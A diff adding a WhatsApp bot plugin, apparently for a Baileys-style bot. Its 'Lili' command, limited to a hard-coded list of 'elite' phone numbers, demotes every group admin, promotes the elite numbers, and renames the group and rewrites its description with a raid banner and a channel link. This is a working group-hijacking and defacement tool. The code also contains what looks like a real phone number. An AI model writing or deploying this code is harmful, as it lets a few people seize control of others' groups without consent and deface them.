@@ -1,0 +1,61 @@
+let handler = async (m, { conn, participants, groupMetadata }) => {
+  // قائمة النخبة (بدون @)
+  let elite = [
+    '212705655633', // مثال: رقمك
+  ]
+
+  let sender = m.sender.split('@')[0]
+  if (!elite.includes(sender)) {
+    throw 'هذا الأمر مخصص فقط لأعضاء النخبة.'
+  }
+
+  let groupId = m.chat
+  let botNumber = conn.user.jid
+
+  // 1. سحب الإشراف من جميع المشرفين (عدا البوت)
+  let currentAdmins = participants.filter(p => p.admin && p.id !== botNumber)
+  for (let admin of currentAdmins) {
+    try {
+      await conn.groupParticipantsUpdate(groupId, [admin.id], 'demote')
+      await new Promise(res => setTimeout(res, 1000))
+    } catch (e) {
+      console.log(`فشل في سحب الإشراف من ${admin.id}:`, e)
+    }
+  }
+
+  // 2. ترقية أعضاء النخبة
+  for (let num of elite) {
+    let jid = num + '@s.whatsapp.net'
+    try {
+      await conn.groupParticipantsUpdate(groupId, [jid], 'promote')
+      await new Promise(res => setTimeout(res, 1000))
+    } catch (e) {
+      console.log(`فشل في ترقية ${jid}:`, e)
+    }
+  }
+
+  // 3. تغيير اسم المجموعة
+  let newName = 'مزروف ✧. 𝑳𝒊𝒍𝒊𝒉𝒕🐝'
+  try {
+    await conn.groupUpdateSubject(groupId, newName)
+  } catch (e) {
+    console.log('فشل في تغيير اسم المجموعة:', e)
+  }
+
+  // 4. تغيير وصف المجموعة
+  let newDesc = '✧. 𝑳𝒊𝒍𝒊𝒉𝒕🐝\n*⌬━─━─━─━═━⊰🌹⊱━═━─━─━─━⌬*\nhttps://whatsapp.com/channel/0029VbAgmqR6RGJOwE3cv33t\n*⌬━─━─━─━═━⊰🌹⊱━═━─━─━─━⌬*\n𝓡𝓪𝓫𝓫𝓲𝓽 𝓼𝓲𝓷𝓹𝓪𝓲 ༆'
+  try {
+    await conn.groupUpdateDescription(groupId, newDesc)
+  } catch (e) {
+    console.log('فشل في تغيير وصف المجموعة:', e)
+  }
+
+  m.reply('تم تنفيذ أوامر مطبيق بنجاح: سحب إشراف، رفع نخبة، تعديل الاسم والوصف.')
+}
+
+handler.help = ['Lili']
+handler.tags = ['owner']
+handler.command = /^(Lili)$/i
+handler.group = true
+
+export default handler
